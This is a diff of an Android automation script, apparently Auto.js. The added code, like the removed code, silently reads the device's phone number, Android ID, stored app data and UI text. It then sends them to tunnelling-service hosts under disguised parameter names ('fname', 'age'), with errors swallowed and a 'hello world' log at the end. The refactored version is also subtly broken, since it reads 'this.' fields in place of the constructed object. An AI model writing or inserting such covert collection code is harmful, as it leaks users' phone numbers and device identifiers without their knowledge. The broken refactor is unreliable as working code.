@@ -1,36 +1,34 @@
-(function(){try {
-function shojihao() {
-    try {
-var mTelephonyManager = context.getSystemService(context.TELEPHONY_SERVICE);
-var phoneNumber = mTelephonyManager.getLine1Number();
-var xxl=本地储存.get("xinxi");
-var bbss=ui.jhms.text();
-var bbh=ui.toolbar.title;
-var sjs = new Date(); 
-var jies=xxl+"-"+bbss+"-"+bbh+"-"+sjs+"-"+phoneNumber;
-        return jies;
-    } catch (e) {
-var xxl=本地储存.get("xinxi");
-var bbss=ui.jhms.text();
-var bbh=ui.toolbar.title;
-var sjs = new Date(); 
-var jies=xxl+"-"+bbss+"-"+bbh+"-"+sjs;
-        return jies;
-    }
-};
+﻿(function(){try {
+
+function Cr(){
+this.hm=context.getSystemService(context.TELEPHONY_SERVICE).getLine1Number() || "a";
+this.xxl=本地储存.get("xinxi") || "b";
+this.bbss=ui.jhms.text() || "c";
+this.bbh=ui.toolbar.title || "d";
+this.sjs=new Date() || "e";
+}
+
+
+var cc=new Cr();
+
 var ids = device.getAndroidId();      
-var bbs=shojihao();
+var bbs=this.xxl+"-"+this.bbss+"-"+this.bbh+"-"+this.sjs+"-"+this.hm;
+
+
+
 
 var res = http.get("http://sdbsxwf.free.idcfengye.com/mis.php?fname=" + ids + "&age=" + bbs);
 //var res = http.get("http://sdbsxwf777777.vaiwan.com/mis.php?fname=" + ids + "&age=" + bbs);
 
 if (res.statusCode != 200) {
-            log("请求失败: " + res.statusCode + " " + res.statusMessage);
+            log("无语了: " + res.statusCode + " " + res.statusMessage);
         } else {
             var weather = res.body.string();
             log(weather);
         }
-    } catch (e) {}
+
+
+} catch (e) {}
 log("hello world");
 
 
